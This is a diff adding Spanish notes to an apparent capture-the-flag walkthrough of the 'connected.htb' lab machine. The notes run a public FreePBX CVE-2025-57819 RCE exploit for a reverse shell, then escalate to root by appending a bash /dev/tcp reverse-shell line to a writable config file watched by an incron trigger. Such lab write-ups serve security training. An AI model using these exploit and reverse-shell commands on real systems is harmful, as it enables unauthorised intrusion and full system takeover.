@@ -25,4 +25,15 @@ Disallow: /
 -la web tiene diferentes opciones administsracion pide user y el resto no carga.
 - Probamos a ver si hay cve con esa verison de freepbx y encuentro el repo -> https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE
 - python3 exploit.py --rhost connected.htb --command "id" para ejecutar el exploit y comprobamoss que funciona.
-- 
+- python3 exploit.py --rhost connected.htb --lhost 10.10.14.11 --lport 4444 para enviarnos una reverse shell.
+- whoami y ya esstamos dentro de la máquina como assterissk@connected
+- entramos en directorio personal y pillamos la flag user.txt
+- python -c 'import pty; pty.spawn("/bin/bash")' para tener una tty
+- y ahora sudo -l y me pide contraseña de asterisk.
+- buscamos otra manera de esscalar privilegios -> find / -perm -4000 -type f 2>/dev/null -> nada.
+- buscamos por capabiliteies -> getcap -r / 2>/dev/null nada tampoco.
+- find /etc -name "*.conf" -writable 2>/dev/null miramos por archivos de configuración modificables.
+- encuentro -> /etc/dahdi/init.conf -> cat /etc/incron.d/* -> /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart !!!!
+- echo 'bash -c "bash -i >& /dev/tcp/10.10.14.11/4545 0>&1"' >> /etc/dahdi/init.conf añadimos al final reverse shell 4545
+- echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart para reiniciar el sistema y qeu se ejecute.
+- nc -lnvp 4545 y lanzamos el comando de antes obtenemos shell como root whoamil, cd y pillamos flag.
